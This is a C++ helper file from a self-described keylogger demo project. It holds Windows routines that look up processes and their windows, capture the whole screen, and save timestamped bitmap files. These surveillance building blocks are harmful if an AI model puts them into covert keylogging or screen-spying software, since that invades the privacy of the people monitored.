/**@file util.cpp
 *
 * This is part of keylogger, demo project to hook key event of a process
 * and do periodic screenshoot of screen.
 *
 * @author Oky Firmansyah <mail@okyfirmansyah.net>.
 *
 * @date Created      : Apr 03, 2017 okyfirmansyah
 */

#include <tchar.h>
#include <windows.h>
#include <winbase.h>
#include <string>
#include <functional>
#include <tlhelp32.h>
#include <memory>
#include <atomic>
#include "log.h"
#include <time.h>
#include <ole2.h>
#include <olectl.h>

/** implementation of some helper functions
 */

using namespace std;

/** used by getHwndFromProcessId
  */
static BOOL CALLBACK getHwndFromProcessIdCB(HWND hwnd, LPARAM lParam)
{
    std::function<BOOL(HWND)>* func=reinterpret_cast<std::function<BOOL(HWND)>*>(lParam);
    return (*func)(hwnd);
}

/** get HWND from a PID
 */
HWND getHwndFromProcessId(DWORD processId)
{
    HWND gHwnd;

    //child routine
    std::function<BOOL(HWND)> func=[&processId, &gHwnd]
    (HWND hwnd)->BOOL
    {
       DWORD lpdwProcessId;
       GetWindowThreadProcessId(hwnd,&lpdwProcessId);
       if(lpdwProcessId==processId)
       {
           gHwnd=hwnd;
           return FALSE;
       }
       return TRUE;
    };

    //iterate windows, each will call func()
    EnumWindows(getHwndFromProcessIdCB, (LPARAM)&func);
    return gHwnd;
}

/** find first process that having name procName,
  * if found, execute func(entry) and stop
  */
void iterateProcess(const std::function<bool(PROCESSENTRY32* entry)>& func)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if(func(&entry)==true)
                break;
        }
    }

    CloseHandle(snapshot);
}

/** find first process that having name procName,
  * if found, execute func(entry) and stop
  */
bool findFirstProcess(string procName, const std::function<void(PROCESSENTRY32*entry)>& func)
{
    bool found=false;
    iterateProcess([&found,&func,&procName](PROCESSENTRY32*entry)->bool
                   {
                      if (procName.compare(entry->szExeFile) == 0)
                      {
                          found=true;
                          func(entry);
                          return true;//break here
                      }
                      return false;
                   });
    return found;
}

/** find process that having name procName,
  * each encounter will call func(entry)
  */
bool findProcess(string procName, const std::function<void(PROCESSENTRY32*entry)>& func)
{
    bool found=false;
    iterateProcess([&found,&func,&procName](PROCESSENTRY32*entry)->bool
                   {
                      if (procName.compare(entry->szExeFile) == 0)
                      {
                          found=true;
                          func(entry);
                      }
                      return false;//always look for next process, even if already found
                   });
    return found;
}

/** dump HBITMA to bmp file(save .jpg for later)
 */
bool saveBitmap(string filename, HBITMAP bmp, HPALETTE pal)
{
    bool result = false;
    PICTDESC pd;

    pd.cbSizeofstruct   = sizeof(PICTDESC);
    pd.picType      = PICTYPE_BITMAP;
    pd.bmp.hbitmap  = bmp;
    pd.bmp.hpal     = pal;

    LPPICTURE picture;
    HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
                       reinterpret_cast<void**>(&picture));

    if (!SUCCEEDED(res))
    return false;

    LPSTREAM stream;
    res = CreateStreamOnHGlobal(0, true, &stream);

    if (!SUCCEEDED(res))
    {
    picture->Release();
    return false;
    }

    LONG bytes_streamed;
    res = picture->SaveAsFile(stream, true, &bytes_streamed);

    HANDLE file = CreateFile(filename.c_str(), GENERIC_WRITE, FILE_SHARE_READ, 0,
                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (!SUCCEEDED(res) || !file)
    {
    stream->Release();
    picture->Release();
    return false;
    }

    HGLOBAL mem = 0;
    GetHGlobalFromStream(stream, &mem);
    LPVOID data = GlobalLock(mem);

    DWORD bytes_written;

    result   = !!WriteFile(file, data, bytes_streamed, &bytes_written, 0);
    result  &= (bytes_written == static_cast<DWORD>(bytes_streamed));

    GlobalUnlock(mem);
    CloseHandle(file);

    stream->Release();
    picture->Release();

    return result;
}


/** take screenshot, save it to the path\YYYYMMDD_HHMMSS.bmp
  */
bool takeScreenShot(string path)
{
    // set filename
    time_t timer;
    char buffer[100];
    time(&timer);
    struct tm* timeinfo = localtime (&timer);

    //strftime (buffer,sizeof(buffer),"[%F %R]",timeinfo);
    snprintf(buffer, sizeof(buffer),"%.4d%.2d%.2d_%.2d%.2d%.2d.bmp",  1900+timeinfo->tm_year,
                                                           1+timeinfo->tm_mon,
                                                           timeinfo->tm_mday,
                                                           timeinfo->tm_hour,
                                                           timeinfo->tm_min,
                                                           timeinfo->tm_sec);
    string filename=path+buffer;

    HDC hdcSource = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcSource);

    int width = GetDeviceCaps(hdcSource, HORZRES);
    int height = GetDeviceCaps(hdcSource, VERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, width, height);
    HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

    BitBlt(hdcMemory, 0, 0, width, height, hdcSource, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

    DeleteDC(hdcSource);
    DeleteDC(hdcMemory);

    HPALETTE hpal = NULL;
    if(saveBitmap(filename, hBitmap, hpal)) return true;
    return false;
}
